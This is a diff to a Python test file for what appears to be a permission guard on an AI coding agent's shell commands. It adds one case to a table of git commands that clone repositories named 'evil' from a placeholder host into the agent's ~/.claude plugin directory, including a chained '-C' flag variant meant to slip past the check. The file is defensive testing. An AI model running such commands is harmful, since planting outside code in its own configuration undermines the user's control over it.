@@ -124,6 +124,7 @@ BASH_CASES = [
     ("git clone https://example.invalid/evil ~/.claude/plugins/evil", "ask", "agent-config-dir"),
     ("cd ~/.claude/plugins && git clone https://example.invalid/evil.git", "ask", "agent-config-dir"),
     ("git -C ~/.claude clone --depth 1 https://example.invalid/e.git plugins/e", "ask", "agent-config-dir"),
+    ("git -C /tmp -C ~/.claude clone https://example.invalid/e.git plugins/e", "ask", "agent-config-dir"),
     ("git worktree add ~/.claude/x", "ask", "agent-config-dir"),
     ("git clone https://example.invalid/e.git vendor/e", None, None),
     # A string an interpreter passes to a shell is a command; any other literal may
